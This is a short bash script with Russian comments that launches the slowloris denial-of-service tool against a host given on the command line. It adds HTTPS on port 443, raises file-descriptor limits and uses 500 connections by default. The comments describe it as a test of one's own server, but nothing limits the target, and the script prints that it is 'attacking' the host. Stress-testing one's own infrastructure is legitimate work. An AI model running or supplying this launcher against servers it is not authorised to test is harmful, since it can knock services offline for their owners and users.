#!/bin/bash
# Запуск slowloris-теста против собственного сервера.
# Использование: bash run.sh <HOST> [PORT] [SOCKETS]
#   HOST    - IP/домен вашего сервера (обязательно)
#   PORT    - порт, по умолчанию 80 (для TLS используйте 443 — https включится автоматически)
#   SOCKETS - число соединений, по умолчанию 500

HOST="$1"
PORT="${2:-80}"
SOCKETS="${3:-500}"

if [ -z "$HOST" ]; then
    echo "Использование: bash run.sh <HOST> [PORT] [SOCKETS]"
    exit 1
fi

# поднимаем лимит открытых файловых дескрипторов под текущий процесс
ulimit -n 4096 2>/dev/null || true

EXTRA_ARGS=()
if [ "$PORT" = "443" ]; then
    EXTRA_ARGS+=(--https)
fi

echo "[+] Атакую $HOST:$PORT, сокетов: $SOCKETS"
slowloris "$HOST" -p "$PORT" -s "$SOCKETS" "${EXTRA_ARGS[@]}"
